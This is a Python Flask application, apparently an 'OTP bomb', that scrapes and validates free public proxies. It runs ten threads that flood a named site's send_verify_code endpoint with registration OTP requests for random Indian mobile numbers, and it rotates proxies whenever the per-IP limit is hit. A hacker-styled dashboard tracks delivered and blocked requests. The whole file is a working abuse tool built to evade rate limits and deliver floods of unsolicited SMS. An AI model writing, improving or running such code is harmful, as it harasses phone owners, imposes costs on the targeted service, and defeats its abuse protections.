import os
import time
import random
import json
import threading
import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, jsonify, render_template_string, Response

app = Flask(__name__)

# --- GLOBAL STATE ---
STATE = {
    "start_time": time.time(),
    "start_time_str": datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC"),
    "code_200": 0,
    "code_400": 0,
    "proxies_fetched": 0,
    "proxies_dead": 0,
    "proxies_live": 0,
    "logs": []
}

PROXIES_LIVE_QUEUE = []
BG_THREADS_STARTED = False
LOG_LOCK = threading.Lock()

# --- LOGGING SYSTEM ---
def log_sys(msg, level="info", target="N/A", proxy="N/A"):
    """Thread-safe logging system that pushes data to the UI."""
    with LOG_LOCK:
        entry = {
            "time": datetime.now().strftime("%H:%M:%S"),
            "message": msg,
            "level": level,
            "target": target,
            "proxy": proxy
        }
        STATE["logs"].insert(0, entry)
        # Cap memory usage for Render's free tier
        if len(STATE["logs"]) > 2000:
            STATE["logs"] = STATE["logs"][:2000]

# --- MULTIPLE PROXY FETCHERS ---
def fetch_raw_proxies():
    """Fetches free proxies from 4 different global sources."""
    sources = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"
    ]
    
    raw_proxies = set()
    log_sys("SYSTEM: Reaching out to 4 global proxy APIs...", "info")
    
    for url in sources:
        try:
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200:
                lines = resp.text.strip().split('\n')
                for line in lines:
                    proxy = line.strip()
                    if ":" in proxy:
                        raw_proxies.add(proxy)
        except Exception as e:
            log_sys(f"SYSTEM: Failed to fetch from {url} - {str(e)}", "warn")

    proxy_list = list(raw_proxies)
    random.shuffle(proxy_list)
    return proxy_list[:500] # Take exactly 500 random proxies

def check_single_proxy(proxy):
    """Pings a lightweight endpoint to check if the proxy is actually alive."""
    proxies = {
        "http": f"http://{proxy}",
        "https": f"http://{proxy}"
    }
    try:
        # Generate 204 is a fast, empty response from Google used for connectivity checks
        res = requests.get("http://connectivitycheck.gstatic.com/generate_204", proxies=proxies, timeout=5)
        if res.status_code == 204:
            PROXIES_LIVE_QUEUE.append(proxy)
            STATE["proxies_live"] += 1
            log_sys(f"VALIDATED: Proxy is ALIVE and added to queue.", "success", proxy=proxy)
        else:
            STATE["proxies_dead"] += 1
    except:
        STATE["proxies_dead"] += 1

def proxy_manager_thread():
    """Background thread that ensures the live proxy queue never runs dry."""
    while True:
        if len(PROXIES_LIVE_QUEUE) < 20:
            log_sys(f"SYSTEM: Live proxy queue low ({len(PROXIES_LIVE_QUEUE)}). Fetching 500 new proxies...", "info")
            new_proxies = fetch_raw_proxies()
            STATE["proxies_fetched"] += len(new_proxies)
            
            log_sys(f"SYSTEM: Downloaded {len(new_proxies)} raw proxies. Spawning 50 threads to verify...", "info")
            
            # Use 50 threads to quickly check all 500 proxies
            with ThreadPoolExecutor(max_workers=50) as executor:
                executor.map(check_single_proxy, new_proxies)
                
            log_sys(f"SYSTEM: Verification complete. Total Live Queue: {len(PROXIES_LIVE_QUEUE)}", "success")
        
        time.sleep(5)

# --- OTP WORKER LOGIC ---
def otp_worker_thread(worker_id):
    """Worker thread that grabs a proxy and blasts OTPs until it hits a 400 limit."""
    while True:
        if not PROXIES_LIVE_QUEUE:
            time.sleep(2)
            continue
            
        # 1. Grab a guaranteed live proxy
        current_proxy = PROXIES_LIVE_QUEUE.pop(0)
        STATE["proxies_live"] = len(PROXIES_LIVE_QUEUE)
        log_sys(f"[THREAD-{worker_id}] Acquired live proxy. Engaging target loop.", "info", proxy=current_proxy)
        
        proxy_dict = {
            "http": f"http://{current_proxy}",
            "https": f"http://{current_proxy}"
        }

        # 2. Loop on this specific proxy until blocked
        while True:
            # Generate Indian Mobile Number (+91 followed by 6,7,8,9 and 9 digits)
            mobile = "+91" + random.choice("6789") + "".join(random.choices("0123456789", k=9))
            
            # Formulate Cooe API Request
            url = "https://cooe03.in/user/send_verify_code"
            payload = {"mobile_number": mobile, "verify_type": "register"}
            headers = {
                "Origin": "https://cooe03.in",
                "Referer": "https://cooe03.in/",
                "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.{worker_id} Safari/537.36",
                "Content-Type": "application/json;charset=UTF-8",
                "Accept": "application/json, text/plain, */*"
            }

            log_sys(f"[THREAD-{worker_id}] Sending OTP packet...", "info", target=mobile, proxy=current_proxy)

            try:
                # 3. Fire the request
                res = requests.post(url, json=payload, headers=headers, proxies=proxy_dict, timeout=10)
                
                try:
                    data = res.json()
                    code = data.get("code", res.status_code)
                except:
                    code = res.status_code

                # 4. Handle Server Response
                if code == 200:
                    STATE["code_200"] += 1
                    log_sys(f"[THREAD-{worker_id}] STATUS 200: OTP Packet delivered.", "success", target=mobile, proxy=current_proxy)
                    time.sleep(1) # Small delay before reusing same proxy
                    continue # Loop again with the same proxy
                    
                elif code == 400:
                    STATE["code_400"] += 1
                    log_sys(f"[THREAD-{worker_id}] STATUS 400: IP limit reached. Proxy burned.", "error", target=mobile, proxy=current_proxy)
                    break # Break inner loop, grab a new proxy
                    
                else:
                    log_sys(f"[THREAD-{worker_id}] UNKNOWN {code}: Bad response. Burning proxy.", "warn", target=mobile, proxy=current_proxy)
                    break # Break inner loop, grab a new proxy

            except Exception as e:
                log_sys(f"[THREAD-{worker_id}] TIMEOUT/DROP: Proxy disconnected. Burning.", "error", target=mobile, proxy=current_proxy)
                break # Break inner loop, grab a new proxy

# --- FLASK SERVER & BOOTSTRAP ---
def init_background_threads():
    global BG_THREADS_STARTED
    if not BG_THREADS_STARTED:
        log_sys("SYSTEM: Initializing background routing threads...", "info")
        
        # Start Proxy Manager
        threading.Thread(target=proxy_manager_thread, daemon=True).start()
        
        # Start 10 Simultaneous OTP Workers
        for i in range(1, 11):
            threading.Thread(target=otp_worker_thread, args=(i,), daemon=True).start()
            
        BG_THREADS_STARTED = True

@app.before_request
def activate_threads():
    # Ensures threads start safely inside Render's Gunicorn workers
    init_background_threads()

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/stats')
def stats():
    uptime_seconds = int(time.time() - STATE["start_time"])
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    
    return jsonify({
        "uptime": f"{hours:02d}h {minutes:02d}m {seconds:02d}s",
        "started_at": STATE["start_time_str"],
        "code_200": STATE["code_200"],
        "code_400": STATE["code_400"],
        "proxies_fetched": STATE["proxies_fetched"],
        "proxies_dead": STATE["proxies_dead"],
        "proxies_live_queue": len(PROXIES_LIVE_QUEUE),
        "logs": STATE["logs"][:80] # Send latest 80 logs to UI
    })

@app.route('/api/export')
def export_data():
    def generate():
        yield json.dumps({
            "export_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "statistics": {
                "total_200": STATE["code_200"],
                "total_400": STATE["code_400"],
                "proxies_fetched": STATE["proxies_fetched"],
                "proxies_dead": STATE["proxies_dead"]
            },
            "activity_logs": STATE["logs"]
        }, indent=4)
    return Response(generate(), mimetype='application/json', headers={'Content-Disposition': 'attachment;filename=otp_traffic_logs.json'})

# --- UI TEMPLATE (Cyber Hacker Vibe) ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SYS.TERMINAL // PROXY-OTP BOMB</title>
    <style>
        body {
            background-color: #050505;
            color: #00ff00;
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            padding: 20px;
        }
        h1 {
            text-align: center;
            text-shadow: 0 0 10px #00ff00;
            border-bottom: 1px solid #00ff00;
            padding-bottom: 10px;
            letter-spacing: 2px;
        }
        .header-info {
            text-align: center;
            margin-bottom: 20px;
            color: #00ffff;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }
        .stat-box {
            border: 1px solid #00ff00;
            padding: 15px;
            text-align: center;
            background: rgba(0, 255, 0, 0.03);
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.1);
        }
        .stat-value {
            font-size: 26px;
            font-weight: bold;
            margin-top: 10px;
            text-shadow: 0 0 5px #00ff00;
        }
        .box-red { border-color: #ff3333; color: #ff3333; box-shadow: 0 0 10px rgba(255, 51, 51, 0.2); }
        .box-red .stat-value { text-shadow: 0 0 5px #ff3333; }
        
        .box-cyan { border-color: #00ffff; color: #00ffff; box-shadow: 0 0 10px rgba(0, 255, 255, 0.2); }
        .box-cyan .stat-value { text-shadow: 0 0 5px #00ffff; }

        .box-gray { border-color: #888; color: #888; box-shadow: 0 0 10px rgba(136, 136, 136, 0.2); }
        .box-gray .stat-value { text-shadow: 0 0 5px #888; }

        .terminal-container {
            margin-top: 20px;
            background: #000;
            border: 1px solid #00ff00;
            box-shadow: inset 0 0 20px rgba(0,255,0,0.2);
            padding: 15px;
            height: 500px;
            overflow-y: auto;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 8px;
            text-align: left;
            border-bottom: 1px solid #003300;
            font-size: 13px;
        }
        th {
            background: #002200;
            position: sticky;
            top: 0;
            color: #fff;
        }
        .level-system { color: #00ffff; }
        .level-success { color: #00ff00; }
        .level-error { color: #ff3333; }
        .level-warn { color: #ffcc00; }
        .level-info { color: #aaaaaa; }
        
        .btn-export {
            display: block;
            width: 100%;
            padding: 15px;
            background: #002200;
            color: #00ff00;
            border: 1px solid #00ff00;
            font-family: 'Courier New', Courier, monospace;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            text-align: center;
            text-decoration: none;
            transition: 0.3s;
            box-sizing: border-box;
        }
        .btn-export:hover {
            background: #00ff00;
            color: #000;
            box-shadow: 0 0 15px #00ff00;
        }
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #050505; border-left: 1px solid #00ff00; }
        ::-webkit-scrollbar-thumb { background: #00ff00; }
    </style>
</head>
<body>

    <h1>[ SYS.TERMINAL // PROXY-OTP ROUTER ]</h1>
    <div class="header-info">
        SERVER STARTED: <span id="val_started">--</span> | UPTIME: <span id="val_uptime">--</span>
    </div>

    <div class="stats-grid">
        <div class="stat-box box-cyan">
            <div>PROXIES FETCHED</div>
            <div class="stat-value" id="val_fetched">0</div>
        </div>
        <div class="stat-box">
            <div>PROXIES LIVE QUEUE</div>
            <div class="stat-value" id="val_live">0</div>
        </div>
        <div class="stat-box box-gray">
            <div>PROXIES DEAD</div>
            <div class="stat-value" id="val_dead">0</div>
        </div>
        <div class="stat-box">
            <div>CODE 200 (SUCCESS)</div>
            <div class="stat-value" id="val_200">0</div>
        </div>
        <div class="stat-box box-red">
            <div>CODE 400 (LIMIT HIT)</div>
            <div class="stat-value" id="val_400">0</div>
        </div>
    </div>

    <a href="/api/export" target="_blank" class="btn-export">>> EXPORT FULL TRAFFIC HISTORY (.JSON) <<</a>

    <div class="terminal-container">
        <table>
            <thead>
                <tr>
                    <th width="10%">TIME</th>
                    <th width="45%">EVENT LOG</th>
                    <th width="20%">TARGET (MOBILE)</th>
                    <th width="25%">ROUTED PROXY</th>
                </tr>
            </thead>
            <tbody id="log_body">
                <tr><td colspan="4">Initializing system... Please refresh the page if logs do not appear.</td></tr>
            </tbody>
        </table>
    </div>

    <script>
        function fetchStats() {
            fetch('/api/stats')
                .then(res => res.json())
                .then(data => {
                    document.getElementById('val_uptime').innerText = data.uptime;
                    document.getElementById('val_started').innerText = data.started_at;
                    document.getElementById('val_fetched').innerText = data.proxies_fetched;
                    document.getElementById('val_live').innerText = data.proxies_live_queue;
                    document.getElementById('val_dead').innerText = data.proxies_dead;
                    document.getElementById('val_200').innerText = data.code_200;
                    document.getElementById('val_400').innerText = data.code_400;

                    const tbody = document.getElementById('log_body');
                    tbody.innerHTML = ''; 
                    
                    data.logs.forEach(log => {
                        const tr = document.createElement('tr');
                        tr.className = `level-${log.level}`;
                        tr.innerHTML = `
                            <td>${log.time}</td>
                            <td>${log.message}</td>
                            <td>${log.target}</td>
                            <td>${log.proxy}</td>
                        `;
                        tbody.appendChild(tr);
                    });
                })
                .catch(err => console.error("Sync Error:", err));
        }

        // Poll API every 1.5 seconds
        setInterval(fetchStats, 1500);
        
        // Initial Fetch
        setTimeout(fetchStats, 500);
    </script>
</body>
</html>
"""

if __name__ == '__main__':
    # Flask app runs on the assigned port
    port = int(os.environ.get('PORT', 5000))
    # We trigger the threads BEFORE running the app to ensure they start immediately
    init_background_threads()
    app.run(host='0.0.0.0', port=port)
